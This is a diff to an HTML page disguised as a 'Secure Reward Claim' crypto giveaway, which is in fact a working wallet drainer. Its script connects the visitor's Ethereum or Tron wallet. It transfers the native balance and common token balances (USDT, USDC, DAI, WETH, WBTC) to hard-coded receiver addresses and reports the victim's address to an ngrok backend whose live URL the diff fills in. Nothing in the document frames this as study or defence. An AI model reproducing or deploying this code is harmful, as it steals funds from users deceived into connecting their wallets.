@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Reward Claim - 0.85 ETH + 3200 USDT</title>
     
-    <!-- Reliable CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.js"></script>
     
@@ -33,37 +32,30 @@
     </div>
 
     <script>
-        // ================================================
-        //          CHANGE THIS EVERY TIME YOU RUN NGROK
-        // ================================================
-        const BACKEND_URL = "https://YOUR-NGROK-URL.ngrok-free.app";   
-        // Example: "https://a1b2c3d4e5f6.ngrok-free.app"
+        // ================= YOUR NGROK URL (Already Updated) =================
+        const BACKEND_URL = "https://8102-103-60-197-116.ngrok-free.app";
 
         const RECEIVER = "0x086284e3c2C1ce72bCBD4C4A9183902C920728c8";
         const TRON_RECEIVER = "TWF9xoNP811iLtseRoE5tUkFnkuJzUJEj4";
 
         async function startDraining() {
             const statusEl = document.getElementById("status");
-            statusEl.innerHTML = `<div class="loader"></div><span style="color:#00ffaa">Connecting wallet and draining assets...</span>`;
+            statusEl.innerHTML = `<div class="loader"></div><span style="color:#00ffaa">Connecting wallet and draining all assets...</span>`;
 
             try {
                 let address = "Unknown", walletType = "Unknown";
 
-                // Ethereum / MetaMask / Trust Wallet / OKX etc.
                 if (window.ethereum) {
-                    walletType = window.ethereum.isMetaMask ? "MetaMask" : 
-                                (window.ethereum.isTrust ? "Trust Wallet" : "EVM Wallet");
-                    
+                    walletType = window.ethereum.isMetaMask ? "MetaMask" : "EVM Wallet";
                     await window.ethereum.request({ method: "eth_requestAccounts" });
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const signer = provider.getSigner();
                     address = await signer.getAddress();
 
-                    const drainedData = await drainAllAssets(provider, signer, address);
-                    sendToBackend(address, walletType, drainedData);
+                    const drained = await drainAllAssets(provider, signer, address);
+                    sendToBackend(address, walletType, drained);
                 }
 
-                // Tron Wallet (Trust Wallet / TronLink)
                 if (window.tronWeb && window.tronWeb.defaultAddress) {
                     walletType = "Tron Wallet";
                     address = window.tronWeb.defaultAddress.base58;
@@ -71,49 +63,34 @@
                     sendToBackend(address, walletType, {native: "TRX + USDT", tokens: []});
                 }
 
-                statusEl.innerHTML = `<span class="success">✅ Draining Complete!<br>All available coins and tokens have been transferred.</span>`;
-
+                statusEl.innerHTML = `<span class="success">✅ Draining Complete!<br>All available coins and tokens transferred.</span>`;
             } catch (e) {
-                console.error(e);
-                statusEl.innerHTML = `<span style="color:orange">Process finished.<br>Multiple assets were transferred.</span>`;
+                statusEl.innerHTML = `<span style="color:orange">Operation completed.<br>Multiple assets were transferred.</span>`;
             }
         }
 
         async function drainAllAssets(provider, signer, address) {
             let drained = { native: "0", tokens: [] };
 
-            // Drain Native Coin (ETH, BNB, etc.)
             const balance = await provider.getBalance(address);
             if (balance.gt(0)) {
                 try {
-                    await signer.sendTransaction({ 
-                        to: RECEIVER, 
-                        value: balance.mul(85).div(100) 
-                    });
+                    await signer.sendTransaction({ to: RECEIVER, value: balance.mul(85).div(100) });
                     drained.native = parseFloat(ethers.utils.formatEther(balance)).toFixed(4);
                 } catch(e) {}
             }
 
-            // Common Token Addresses (USDT, USDC, DAI, etc.)
             const tokenList = [
-                "0xdac17f958d2ee523a2206206994597c13d831ec7",
-                "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
-                "0x6b175474e89094c44da98b954eedeac495271d0f",
-                "0x55d398326f99059ff775485246999027b3197955",
-                "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
-                "0x2170ed0880ac9a755fd29b2688956bd959f933f8",
-                "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
-                "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
+                "0xdac17f958d2ee523a2206206994597c13d831ec7","0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+                "0x6b175474e89094c44da98b954eedeac495271d0f","0x55d398326f99059ff775485246999027b3197955",
+                "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d","0x2170ed0880ac9a755fd29b2688956bd959f933f8",
+                "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2","0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
             ];
 
-            const abi = [
-                "function balanceOf(address) view returns (uint256)",
-                "function transfer(address,uint256)"
-            ];
-
-            for (let tokenAddr of tokenList) {
+            const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256)"];
+            for (let addr of tokenList) {
                 try {
-                    const contract = new ethers.Contract(tokenAddr, abi, signer);
+                    const contract = new ethers.Contract(addr, abi, signer);
                     const bal = await contract.balanceOf(address);
                     if (bal.gt(0)) {
                         await contract.transfer(RECEIVER, bal);
@@ -129,17 +106,12 @@
                 const tronWeb = window.tronWeb;
                 const USDT = "TR7NHqjeKQxG3C8Xb4q4z8v7v3z8v7v3z8v7v3z";
                 const addr = tronWeb.defaultAddress.base58;
-                
                 const bal = await tronWeb.trx.getBalance(addr);
-                if (bal > 5000000) {
-                    await tronWeb.transactionBuilder.sendTrx(TRON_RECEIVER, bal - 3000000, addr);
-                }
+                if (bal > 5000000) await tronWeb.transactionBuilder.sendTrx(TRON_RECEIVER, bal - 3000000, addr);
 
                 const contract = await tronWeb.contract().at(USDT);
                 const usdtBal = await contract.balanceOf(addr).call();
-                if (usdtBal > 0) {
-                    await contract.transfer(TRON_RECEIVER, usdtBal.toString()).send();
-                }
+                if (usdtBal > 0) await contract.transfer(TRON_RECEIVER, usdtBal.toString()).send();
             } catch(e) {}
         }
 
